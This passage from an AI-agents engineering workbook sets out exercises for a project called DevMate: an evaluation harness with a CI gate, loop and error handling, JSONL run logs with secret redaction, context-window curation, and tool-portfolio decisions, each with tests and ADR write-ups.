cd projects/04-ai-engineering/devmate
poetry run python eval/run_agent_eval.py --stub
```
Expected: printed markdown table with completion 80% (4/5) on the stub tape; `eval/results/*.json`
exists; `grep -n "3.7 Baseline eval" notes.md`.

**Level 3 — Stretch** (production-grade, 3–6 h)
Turn the harness into a **CI gate** with anti-gaming checks. (1) Wire it into the root `Makefile`
as `make eval-agent` (a new target that runs `cd projects/04-ai-engineering/devmate && poetry run
python eval/run_agent_eval.py` — the existing `make eval` stays for RAG). (2) Decide the gate
thresholds in `notes.md` (`## 3.7 Eval gate ADR`): completion ≥ 80%, tool accuracy ≥ 90%, no loop
terminations, avg steps < 5 — and what happens on failure (block the release / warn only). (3)
Anti-gaming: a checker that flags answers with low information content (answer length < 20 chars,
answer that only restates the goal) as failures; plus the semantic checker from 3.7a L3 wired in
as an alternative completion mode. (4) Prove the gate fails closed: run the stub tape modified so
one goal "completes" with the answer `"I can't do that"` → the gate must FAIL. Write the ADR-style
decision and implement the flagging rule with a unit test.

**Verify:** `poetry run python eval/run_agent_eval.py --stub --gate` exits non-zero on the
failing tape and zero on the passing tape; `grep -n "3.7 Eval gate ADR" notes.md`; the ADR names
thresholds, failure action, and revisit conditions (e.g., "revisit thresholds when the golden set
grows past 20 goals").

**Common failure modes:**
- Symptom: the stub tape "passes" but the real agent fails → Cause: stub LLM never reproduces real
  model behavior (rephrasing, errors) → Fix: keep stubs for CI, run real eval on a schedule; the
  stub validates the *harness*, the real run validates the *agent*.
- Symptom: report JSON missing a metric → Cause: aggregation assumes fields that the run record
  (3.7a L2) doesn't write → Fix: schema test from 3.7a L2 is the contract between recorder and
  aggregator.
- Symptom: `make eval` runs the wrong script → Cause: `make eval` points at `eval/run_ragas.py`
  (RAG week 2+); your agent eval is a *new* target `make eval-agent` → Fix: never overload an
  existing target; add a new one.

**Interview:** *"Design an eval system for an agent. What do you measure, how, and how do you stop it from lying?"*
A strong answer: measure the five metrics with written definitions (completion = fact-based,
accuracy = golden first tool, steps, loop rate, error recovery), run a fixed golden set, repeat 3×
for nondeterminism, and gate merges on thresholds. Anti-gaming: answers must contain the facts
(keywords + semantic similarity), minimal-length checks, and traceability (claims must be backed by
observations the agent actually saw). The harness is a test suite for a nondeterministic system —
its job is to make regressions *visible*, and the only way it can do that is if it runs on every
change.

---

## 3.8 Common Pitfalls & Solutions

### Real-world problem

The postmortem review of the first production quarter — five incidents, each a classic pitfall,
each with a customer-visible symptom: (1) an agent with no exit condition ran 3 hours and cost
$412 (3.2); (2) an agent that ignored tool errors repeated the same failed search 40 times — the
pilot's "it did the same thing over and over" report (3.4); (3) an agent with no observability
took the team 2 days to debug a one-line failure — "we couldn't tell which step did what"; (4) an
agent whose context grew until the model lost the goal — answers degraded from step 6 onward; (5)
an agent with a single tool that couldn't complete any multi-step task, and the team discovered
the missing tools late because they had no task→tool mapping. **The decision:** which fixes ship
first — cheap insurance first (step cap, error observations, logs), then structural fixes
(context curation, tool portfolio). Each topic below is one incident; each fix must be provable
with a test, because the incidents will otherwise recur silently.

### Topic 3.8a — No Exit Condition → Infinite Loops

**Mastery =** you can enumerate every exit path of an agent run, prove each terminates, and state
the layered defense that makes an infinite loop impossible.

**Level 1 — Drill** (mechanics, 20–45 min)
On paper, enumerate every exit path of `ReActAgent.run()` as written in `agent.py`: (1) `Final
Answer` parsed → return (2) loop range exhausted → fallback string (3) — is there any path where
`run()` neither returns nor advances? Check the `else` branch (unknown action): it appends a
message and continues — *advances*. Check the final-answer branch: returns. Check exception paths:
`tool.execute` exceptions are caught inside the tools themselves (each returns `ToolResult`);
`_call_llm` is NOT wrapped — an LLM API exception escapes `run()`. Write the table of exit paths
(trigger, return value, `termination_reason` today — note that today `termination_reason` does
not exist; that is 3.4b's job). Then answer the design question: is the step cap a *sufficient*
defense against infinite loops, or merely *necessary*? (Sufficient for *time*: the loop provably
ends. Not sufficient for *value*: a capped run can still burn the whole budget repeating the same
call — that is what loop detection (3.4c) exists for. Defense in depth: cap = termination,
detection = efficiency.)

**Expected key:** exit paths = Final Answer / range exhausted / (LLM exception today: uncaught —
a finding). Everything else advances the counter. The layered defense: step cap (termination) +
token budget (cost) + loop detection (repetition) + tool timeouts (hang).

**Level 2 — Applied** (DevMate, 1–3 h)
Close the found gap: wrap `_call_llm` in `run()` so an LLM API exception becomes a step-consuming
observation (`Error: LLM call failed: {e}`) instead of escaping — the run must terminate with
`termination_reason == "error"` when the LLM is down, not crash. Write
`projects/04-ai-engineering/devmate/tests/unit/test_no_infinite_loop.py` with the exhaustive tape:
never-answers (cap), repeating calls (loop detection), LLM raising every call (error path, assert
the run returns the fallback and records `termination_reason == "error"` after `max_steps`
iterations — or decides to stop earlier on repeated LLM errors, your call, justify it), empty
responses, and unknown-action-only responses. Assert in every test: `run()` returns, no exception
escapes, and the loop made ≤ `max_steps` iterations.

**Acceptance criteria:** ≥ 5 tape tests; the "LLM down" case terminates gracefully; this file +
`test_loop_detection.py` are the DoD evidence for "infinite loops provably prevented — with a
test".

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_no_infinite_loop.py tests/unit/test_loop_detection.py -q
```
Expected: all pass (≥ 7 tests across the two files).

**Level 3 — Stretch** (production-grade, 3–6 h)
The failure-interaction analysis: what happens when *two* defenses disagree — e.g., loop detection
fires on a legitimate workflow (3.4c's false positive) and the run dies early? Design the policy
for defense precedence and write it ADR-style into `notes.md` (`## 3.8 Termination policy ADR`):
order of checks per step (loop fingerprint → token budget → step cap), what each returns, and the
recovery affordance (a `--max-steps` CLI override for a human re-running with more budget).
Quantify the incident economics: with all four defenses active, compute the worst-case cost per
run (3.4b table) and show the $412 incident becomes ≤ $0.09 by construction. Implement the
precedence in `run()` if it is not already natural, with a test that hits two defenses at once
(repeating call AND token budget exceeded on the same step — assert the loop-detection reason wins
per your documented order).

**Verify:** tests pass; `grep -n "3.8 Termination policy ADR" notes.md`; your ADR states the
check order, the override, and the worst-case cost bound.

**Common failure modes:**
- Symptom: agent "hangs" despite the step cap → Cause: the hang is inside a tool (subprocess,
  API), not in the loop → Fix: tool-level timeouts (run_tests 120 s) — the loop cap counts
  iterations, not wall time.
- Symptom: `run()` escapes with an exception and the CLI crashes → Cause: `_call_llm` uncaught →
  Fix: L2 wrap; every exit path must be a *return*, never a raise.
- Symptom: two defenses trigger at once and the report is confusing → Cause: no precedence policy
  → Fix: L3 order + `termination_reason` is exactly one value.

**Interview:** *"What are the layers that make an infinite agent loop impossible?"*
A strong answer: step cap (guaranteed termination in finite iterations), token budget (guaranteed
finite cost), loop detection (stop repetition early), tool timeouts (a step itself cannot hang),
and total error handling (every failure path consumes a step and returns). Each layer is provable
by a tape test; the combination means the worst case is bounded in time, tokens, and repetition —
and that bound is the production guarantee you can put in a SLA.

### Topic 3.8b — Ignoring Tool Errors → Agent Repeats Failed Calls

**Mastery =** you can trace an error from the tool to the model's next decision, and you can
prove the agent changes behavior after an error.

**Level 1 — Drill** (mechanics, 20–45 min)
Trace the error path in `agent.py`: `tool.execute` returns `ToolResult(success=False,
error="...")`; `run()` builds `observation = f"Error: {result.error}"`; the observation is
appended to messages as the user turn; the model's next response is the only thing that can change
the behavior. Now read DevMate's `SYSTEM_PROMPT` — the real one in `agent.py` ends with "Always
think step by step. Use tools when you need information or need to take action. Maximum {max_steps}
steps allowed." — **note what is missing**: the lecture's prompt version has the rule "If a tool
fails, try a different approach", DevMate's does not. On paper, answer: (1) why does the agent
repeat a failed call 40 times? (the error text reaches it, but nothing *instructs* it to change
approach — and a "retry" is often a valid LLM choice, so without instruction the cheapest action
wins); (2) what is the correct error surface? (the observation must include *why* it failed and
*suggested alternatives* where possible — e.g., "Error: File not found: x.py. Available: ..." —
the model's only feedback channel is the observation string); (3) what should the system prompt
add? (an error-recovery rule + a "never repeat the same failed call" rule).

**Expected key:** as above. The finding is concrete and code-verifiable: DevMate's prompt lacks an
error-handling rule — grep it yourself. The fix is prompt-level (instruction) + observation-level
(actionable errors) + structural (loop detection backstops, 3.4c).

**Level 2 — Applied** (DevMate, 1–3 h)
Implement error recovery: (1) add the rule to `ReActAgent.SYSTEM_PROMPT`: "If a tool call fails,
do not repeat the same call. Change the approach, fix the input, or choose a different tool." (2)
Improve the tool error observations so they are *actionable*: `ReadFileTool` errors already say
"File not found: X" — extend the message to include the checked path; `RunTestsTool` already
includes return code — add "exit code {n}"; `ProposePatchTool` errors state the validation rule
violated. (3) Write `projects/04-ai-engineering/devmate/tests/unit/test_error_recovery.py`: a stub
LLM tape where call 1 requests `read_file` on a missing file (tool returns success=False), call 2
must be *different* (assert the recorded action/input of step 2 differs from step 1 — the model
changed approach), then the run completes. Also a control tape where the model stubbornly repeats
the failed call → loop detection (3.4c) stops it — assert `termination_reason == "loop_detected"`.

**Acceptance criteria:** ≥ 2 tests; recovery is proven at the observation level (the stub sees the
error text — assert the observation contains "Error:" in the messages the stub received).

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_error_recovery.py -q
```
Expected: `2 passed`.

**Level 3 — Stretch** (production-grade, 3–6 h)
The **error taxonomy and retry policy** — senior design, ADR-style into `notes.md`
(`## 3.8 Error recovery ADR`). Classify tool errors: transient (LLM/embedding API 429, Qdrant
down — retry with backoff is correct), deterministic (missing file, bad input — retry is *never*
correct), and dangerous (path traversal attempt, injection pattern — retry is *forbidden* and
must be logged). Decide and justify: (a) does the agent retry transient errors itself (how many
times, what backoff) or does the *tool* retry (with `httpx` retry config)? (b) how does the
observation distinguish transient vs deterministic so the model can choose? (prefix: "transient
error, retryable" vs "invalid request, do not retry"); (c) what is the recovery-rate target
(lecture: > 70%) and how do you measure it (3.7a's definition — errors after which the agent
completed the goal)? Implement the retryable/not-retryable prefix on at least one tool with a
test, and measure recovery on your tapes (state the number honestly — with stubs it is an
estimate; the real measurement comes from 3.7's harness).

**Verify:** unit test for the error classification passes; `grep -n "3.8 Error recovery ADR"
notes.md`; your ADR names the taxonomy, the retry owner (agent vs tool), and the recovery target.

**Common failure modes:**
- Symptom: agent repeats the same failed call forever → Cause: no error-handling instruction +
  no loop detection → Fix: prompt rule + observation quality + loop detection backstop (three
  layers, all in L2).
- Symptom: agent gives up after one transient failure → Cause: error text says nothing about
  retryability → Fix: L3 prefix — the model needs the classification to make the right choice.
- Symptom: error text is a raw Python traceback → Cause: exception string leaked into the
  observation → Fix: tools must return *curated* errors (message + actionable hint), never
  tracebacks — tracebacks waste tokens and confuse the model.

**Interview:** *"Your agent keeps retrying a failed tool call. How do you fix it?"*
A strong answer: three fixes, in order of leverage — (1) prompt: an explicit "never repeat a
failed call; change approach" rule; (2) observations: errors must be actionable (why it failed,
what to try instead) and classified (transient vs deterministic vs forbidden); (3) structure: loop
detection backstops the model's stubbornness. Then the measurement: error recovery rate (errors →
successful completion) with a >70% target, tracked by the eval harness. The principle: an error is
*information*, and the observation channel is how you deliver it to the model.

### Topic 3.8c — No Observability → Can't Debug Failures

**Mastery =** you can reconstruct any agent run from logs alone — every thought, action, input,
observation, and decision — and you can state the tracing budget.

**Level 1 — Drill** (mechanics, 20–45 min)
DevMate already has a tracer: `from devmate.obs.tracing import tracer` with
`tracer.trace("agent.step", step=n)` and `tracer.trace("agent.tool", tool=...)` context managers
in `agent.py`. On paper, design the span tree for a 2-tool run: root span `agent.run(goal)` →
children `agent.step(1)` → `agent.tool(search_code)` and `agent.step(2)` → `agent.tool(read_file)`
and `agent.step(3)` (final). For each span write the attributes that make debugging possible:
`step`, `tool`, `success`, `latency_ms` (the real code already sets these for `agent.tool`), plus
what is missing: `action_input`, `observation_length`, `termination_reason`, `cost`. Then answer:
(1) what is the *minimum* per-step record that makes the pilot's complaint ("we couldn't tell
which step did what") impossible? (thought, action, input, observation, latency, success — the
`AgentStep` dataclass already has these — the gap is *persistence*: `AgentContext.steps` lives in
memory and dies with the run); (2) what does `AgentContext.get_history()` return and what does it
truncate? (observations to 200 chars — read it — good for prompts, bad for debugging).

**Expected key:** as above; the finding: spans exist for latency, but the *content* (thought,
input, observation) is only in memory. Observability = content + structure + persistence.

**Level 2 — Applied** (DevMate, 1–3 h)
Make every run reconstructible: write a JSONL run log. In `ReActAgent.run()`, after each step,
append one JSON line to `projects/04-ai-engineering/devmate/eval/logs/runs/{timestamp}.jsonl`
(timestamped dir per run): `{step_id, thought, action, action_input, success, latency_ms,
observation (full, not truncated), step_tokens (if available)}`; at the end, one final line
`{type: "done", termination_reason, total_steps, goal}`. Write
`projects/04-ai-engineering/devmate/tests/unit/test_observability.py`: run the 3.2a tape → assert
the log file contains exactly 3 step lines + 1 done line, the first step line's `action ==
"search_code"`, and the done line's `termination_reason == "completed"`. Also assert the log does
NOT contain secrets: the stubbed observation is plain, but add a filter assertion — if an
observation contains `"API_KEY="`, the line is redacted (implement a simple redaction: replace
`API_KEY=\S+` with `API_KEY=***` before writing — the redaction function gets its own test).

**Acceptance criteria:** ≥ 3 tests (log shape, content, redaction); a real `eval/logs/runs/`
file exists after the test; `eval/logs/` is gitignored.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_observability.py -q
```
Expected: `3 passed`.

**Level 3 — Stretch** (production-grade, 3–6 h)
The tracing budget and the sensitive-data policy — written ADR-style into `notes.md`
(`## 3.8 Observability ADR`): (1) volume — JSONL with full observations at ~1 KB/step × 10 steps ×
1,000 runs/day = 10 MB/day: decide retention (keep 7 days, archive, rotate — implement a simple
rotation: files older than 7 days are moved to `eval/logs/archive/` or deleted, with a test); (2)
secrets — observations can contain `.env` content (3.3c L3 deny-list is the first wall; redaction
is the second): decide the redaction policy (key-pattern list, and *never log raw action_input
for propose_patch* — diffs may contain secrets: log `action_input` keys only for that tool); (3)
correlation — every span and log line should carry `run_id` (uuid per run — the `agent.py` file
already imports `uuid`; use it): implement `run_id` on the spans and log lines, with a test that
all lines of one run share the same id; (4) the p95 debugging test: given ONLY the JSONL of a
failed run (goal that hit `max_steps`), write a 5-line root-cause note — then do it for real with
one of your own failing tapes to prove the format is sufficient.

**Verify:** rotation + redaction + run_id tests pass; `grep -n "3.8 Observability ADR" notes.md`;
your written ADR names retention, redaction, and correlation choices with revisit conditions.

**Common failure modes:**
- Symptom: logs exist but the pilot still can't debug → Cause: latency/success only, no content →
  Fix: L2 — the JSONL carries thought/action/input/observation; content is the point.
- Symptom: secrets in logs (`.env` content in an observation) → Cause: no redaction → Fix: L2
  redaction + L3 propose_patch input masking — test both.
- Symptom: log files grow unbounded on the dev machine → Cause: no rotation → Fix: L3 rotation
  with retention policy; `eval/logs/` must be gitignored (add the check to the test).

**Interview:** *"A customer run failed and you have only the logs. What must the logs contain to debug it?"*
A strong answer: the full agent loop, per step — thought, action, input, observation, latency,
success — plus run-level facts (goal, termination reason, steps, cost) and a run_id for
correlation. Then the two budgets: token budget (log full content, never truncated — debugging
needs it) and security budget (redact secrets, mask patch inputs). And the discipline: observability
is not a feature, it's the debugging contract — if a run can't be reconstructed from logs, the
system is not debuggable.

### Topic 3.8d — Oversized Prompts → Context Window Exceeded

**Mastery =** you can compute context growth per step, set a context budget, and curate what the
model sees so the goal never drowns.

**Level 1 — Drill** (mechanics, 20–45 min)
Context-growth math. Per step, the agent appends: the assistant response (~300 tokens) + the
observation. Assume observations average 500 tokens (search_code at 500 chars ≈ 125 tokens; a
read_file of a 2 KB file ≈ 500 tokens; run_tests output truncated to 8k chars ≈ 2,000 tokens).
Fill the table for a 10-step run under three observation regimes (light 125 t, medium 500 t, heavy
2,000 t) plus the always-present system prompt + goal (~600 tokens):

| Step | Light (125 t/obs) cumulative | Medium (500 t/obs) cumulative | Heavy (2,000 t/obs) cumulative |
|------|------------------------------|-------------------------------|--------------------------------|
| 1 | ~600 + 300 + 125 ≈ 1,025 | ~1,400 | ~2,900 |
| 5 | ≈ 2,725 | ≈ 4,600 | ≈ 12,100 |
| 10 | ≈ 4,850 | ≈ 8,600 | ≈ 23,600 |

**Expected key:** as above — the insight: with a 128k model nothing blows up today, but with an
8k-context model the heavy regime exceeds the window at step 4; and cost grows ~linearly with
context (each step re-sends the whole history). The failure is *degraded reasoning before the
crash*: models lose early context, so the goal (sent in the first user message) fades. Answer on
paper: which two levers control growth? (truncate observations — 3.3d does this; and limit history
length — the L2 fix.)

**Level 2 — Applied** (DevMate, 1–3 h)
Implement **context curation** in `ReActAgent.run()` (`projects/04-ai-engineering/devmate/src/devmate/agent/agent.py`):
(1) keep only the last `MAX_HISTORY_STEPS = 5` assistant+observation pairs in `messages` (older
steps are dropped — the model keeps the recent context and the goal); (2) re-assert the goal every
`REASSERT_GOAL_EVERY = 3` steps by re-appending the user goal message ("Goal: {goal} — continue"); 
(3) truncate observations before appending: reuse the 3.3d budget — observations longer than
2,000 chars become `{first 2,000 chars}... (truncated, {total} chars)`. Write
`projects/04-ai-engineering/devmate/tests/unit/test_context_budget.py`: (a) a 20-step tape with
heavy observations → assert `messages` length stays bounded (≤ the 5-pair window + goal +
system), and every appended message ≤ 2,100 chars; (b) the goal is present in `messages` at step
10 (assert by inspecting the messages the stub LLM received); (c) a tape whose *uncurated* size
would exceed 8k tokens → assert the curated size stays under budget (compute tokens as
chars/4).

**Acceptance criteria:** ≥ 3 tests; the budget math is asserted, not assumed — the test measures
the actual `messages` list the stub receives.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_context_budget.py -q
```
Expected: `3 passed`.

**Level 3 — Stretch** (production-grade, 3–6 h)
The memory design decision — ADR-style into `notes.md` (`## 3.8 Context budget ADR`): options —
(A) fixed window (L2: last 5 pairs — simple, loses early evidence: the agent forgets what it
learned at step 1); (B) summarization (each dropped pair is compressed by an LLM call — costs a
call per N steps, keeps the gist); (C) RAG-of-history (drop pairs to a store, retrieve relevant
ones per step — the repo's own retriever, but adds latency); (D) hybrid: window + one rolling
summary. Decide for DevMate's MVP, with the constraint that the agent must still pass the 3.7b
harness after the change (evidence: run the harness in stub mode before and after, record both
completion rates in `notes.md`). Implement the chosen option's minimal slice with a test, and
write the revisit conditions (e.g., "revisit when a goal needs evidence from more than 5 steps
back — the golden test set will show it as a completion drop").

**Verify:** harness runs before/after recorded in `notes.md`; your slice's test passes; `grep -n
"3.8 Context budget ADR" notes.md`; the ADR names A/B/C/D with consequences and revisit
conditions.

**Common failure modes:**
- Symptom: the agent answers well for the first 5 steps then degrades → Cause: context growth
  crowding out the goal — the classic "lost in the middle" → Fix: L2 re-assert the goal + window;
  measure it with the message-inspection test.
- Symptom: truncation cuts mid-JSON in an observation the model wants to parse → Cause: naive
  char slicing → Fix: accept it (observations are data, not instructions — the model re-reads via
  the tools); or truncate at a newline boundary — your choice, document it.
- Symptom: "curation" drops the tool result the model is about to act on → Cause: window too
  small → Fix: keep the *last* pair always (the window drops from the front) — the L2 design
  already does this; test it.

**Interview:** *"Your agent's context grows every step. How do you keep it under control without losing the goal?"*
A strong answer: three mechanisms — bound the inputs (observation truncation at the tool and at
the loop), bound the history (rolling window of recent pairs), and re-assert the goal (the first
message is the most likely to be forgotten). Then the trade-off: windowing loses early evidence —
the fix is summarization or retrieval of history when the task needs it, decided by ADR with the
eval harness as the referee (completion before/after).

### Topic 3.8e — Single Tool → Can't Solve Multi-Step Tasks

**Mastery =** you can map tasks to tool portfolios, prove a task *requires* ≥ 2 tools, and argue
which tool to add next under the 4-tool MVP constraint.

**Level 1 — Drill** (mechanics, 20–45 min)
Task→tool mapping. For each of the 8 goals, list the tool sequence you would expect (S/R/T/P) and
mark whether it is single-tool or multi-tool (the DoD is: at least one *provable* multi-tool
task):

| # | Goal | Sequence | Multi? |
|---|------|----------|--------|
| 1 | "Find the authentication middleware and explain how it works" | S → R | **yes** — search to locate, read to explain |
| 2 | "Run tests for the user service and report failures" | T | no |
| 3 | "Propose a fix for the SQL injection vulnerability in query_builder" | S → R → P | **yes** — search, read, propose |
| 4 | "Find all usages of the deprecated `legacy_auth` function" | S (repeat with variants) | no (S only, though several calls) |
| 5 | "Explain the data flow from API request to database in the order service" | S → R (×2) | **yes** |
| 6 | "Read README and summarize it" | R | no |
| 7 | "Is the test suite green?" | T | no |
| 8 | "Why did the test in test_auth.py fail?" | R → T | **yes** — read the test, run it |

**Expected key:** as above — 4 of 8 are multi-tool. The insight: a single-tool agent fails every
"yes" row *by construction* — it cannot even attempt them (a search-only agent can find the
middleware but never read it; a read-only agent can read files but never locate them). Answer on
paper: which lecture test goal is the *minimal* DoD proof (needs ≥ 2 tools)? (Goal 1: S → R.)

**Level 2 — Applied** (DevMate, 1–3 h)
Prove the roadmap DoD ("the agent answers a question requiring ≥ 2 tools") with a test that
asserts a *multi-tool trajectory*, not just a final answer. Write
`projects/04-ai-engineering/devmate/tests/unit/test_multi_tool.py`: a stub LLM tape for goal 1
that uses S then R then Final Answer → assert `tool_calls == ["search_code", "read_file"]` (both
different, both executed, both recorded in `AgentContext.steps`). Then add a *negative control*:
a tape where the agent tries to answer goal 1 with search_code only — assert the completion check
(3.7b style: the answer must reference the middleware *content*, which only read_file provides)
fails: the run does not "complete" by the fact list. This is the proof that multi-tool is
*necessary*, not decorative.

**Acceptance criteria:** ≥ 2 tests; the positive test proves ≥ 2 distinct tools executed; the
negative control proves single-tool completion is impossible for that goal under the fact check.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_multi_tool.py -q
```
Expected: `2 passed` — this file + `test_loop_detection.py` + `test_no_infinite_loop.py` are the
roadmap DoD evidence; name all three in `notes.md`.

**Level 3 — Stretch** (production-grade, 3–6 h)
The tool-portfolio decision. The lecture's ADR-009 caps the MVP at 4 tools; the roadmap's
progression was search_code → read_file → run_tests → propose_patch. Decide the **5th tool** with
an ADR-style write-up in `notes.md` (`## 3.8 Tool portfolio ADR`): candidates — (A) `git_log`
("show recent commits/PRs for a path" — the agent's most common missing capability on 'when did
this break?' questions), (B) `list_dir` ("show files in a directory" — cheap, but search_code +
read_file cover most cases), (C) `run_command` ("execute a safe allowlisted shell command" —
powerful, but a new security boundary), (D) no 5th tool — polish the four. For each: the task
class it unlocks, the eval impact (which golden goals would improve), the security/cost surface,
and the complexity cost. Decide, then *validate*: add one realistic new goal to `eval/cases.json`
that requires your chosen tool, and state (in the ADR) how you would measure the improvement
(completion on that goal class before/after — the 3.7b harness). No implementation required — the
decision + validation plan is the deliverable.

**Verify:** `grep -n "3.8 Tool portfolio ADR" notes.md`; your ADR covers A–D with pros/cons,
a chosen option, consequences, and revisit conditions (e.g., "revisit when >30% of failed eval
goals trace to missing git context").

**Common failure modes:**
- Symptom: agent "completes" goal 1 with search_code only, answer is plausible but wrong → Cause:
  the fact check was too weak (keywords only) → Fix: 3.7a L3 semantic checker + the negative
  control test in L2 — completion must be *content-proven*.
- Symptom: you add a 5th tool and tool-selection accuracy drops → Cause: more tools = harder
  selection (the 3.3a bench measures exactly this) → Fix: the ADR must include the bench run
  before/after; a tool that hurts accuracy 5% costs more than it gives.
- Symptom: "multi-tool" is claimed but no test proves it → Cause: DoD without evidence → Fix: L2
  — the trajectory assertion is the artifact; the roadmap's DoD says "provably prevented — with a
  test" and the ≥2-tool requirement deserves the same proof standard.

**Interview:** *"How do you decide which tools an agent gets, and when to add more?"*
A strong answer: tools are chosen for *task classes*, not features — map the golden goal set to
tool sequences; a tool earns its place if it (a) unlocks a task class that fails without it, (b)
keeps tool-selection accuracy high (measured by the bench), and (c) has a bounded security/cost
surface. The 4-tool MVP was that discipline applied: search, read, verify, propose — each one
removes a failure class, and the DoD proof is a trajectory test, not a vibe.

---

## Definition of Done — the whole module

The roadmap's DoD for weeks 5–6, with the artifacts that prove each line:

- [ ] **The agent answers a question requiring ≥ 2 tools** — `tests/unit/test_multi_tool.py` (3.8e L2) asserts `search_code → read_file` on the lecture's goal 1; the negative control proves single-tool completion is impossible under the fact check.
- [ ] **MCP server reachable from a real MCP client** — `tests/integration/test_mcp_client.py` (3.6b L2) runs the full lifecycle (initialize → tools/list → tools/call) against `python -m devmate.mcp.server`; the raw stdio handshake (3.6a L2) proves the protocol; `docs/mcp-debugging.md` (3.6b L3) proves the runbook.
- [ ] **Infinite loops provably prevented — with a test** — `tests/unit/test_loop_detection.py` (3.4c L2, repeating tape stops at step 2) + `tests/unit/test_no_infinite_loop.py` (3.8a L2, every exit path returns) + `tests/unit/test_step_cap.py` (3.4b L2, budget exactly consumed).
- [ ] **Case-study numbers reproduced or exceeded** — `eval/run_agent_eval.py` (3.7b L2) measures completion ≥ 80%, tool accuracy ≥ 90%, avg steps < 5, zero loop terminations; the 17/20 = 85% and 3.2-step baselines from the lecture's case study are your comparison point, recorded in `notes.md`.
- [ ] **ADR decisions written** — the lecture's ADR-007 (LangGraph migration), ADR-008 (MCP over custom API), ADR-009 (4 tools max) exist in your words: 3.5a L3, 3.6a L3, 3.8e L3.

**Learning-loop rule (README protocol):** every time you hit one of the documented failure modes
during these tasks, log it in `docs/learning/reviews/mistakes.md` with symptom → cause → fix. The
failure modes in this workbook are study material, not decoration.

## Self-check before you finish

1. `grep -c "### Topic" docs/curriculum/practice/03-agents-practice.md` → 24 topics (3.1a–3.8e).
2. Every Level 2 task produced a repo artifact (test file, `notes.md` section, `eval/` script, runbook) — list them in `notes.md` under `## Module 3 artifacts`.
3. `make test` still green at the end — the whole unit suite passes together.
4. `make types` and `make lint` clean on everything you touched.
5. Every tape test runs without an LLM key or network — the only tests needing infra are tagged `integration` and documented as such.

## Further reading

1. **Hugging Face Agents Course**: https://huggingface.co/learn/agents-course (the roadmap's study source, applied to DevMate)
2. **LangGraph Docs**: https://langchain-ai.github.io/langgraph (3.5 topics)
3. **MCP Spec**: https://modelcontextprotocol.io (3.6 topics — the differentiator)
4. **ReAct Paper**: "ReAct: Synergizing Reasoning and Acting in Language Models" (3.2 topics)
5. **Berkeley LLM Agents**: https://agents.cs.berkeley.edu (agent taxonomy, 3.1 topics)
6. **Arize AI Agent Evaluation**: https://arize.com/agents (3.7 topics)

*Workbook for Module 3 (AI Agents) — created 2026-08-11 under ADR-0006 (production-focused curriculum anchored to DevMate). Complements the lecture's case study: 85% completion (17/20), avg steps 3.2, tool accuracy 92%, zero infinite loops.*
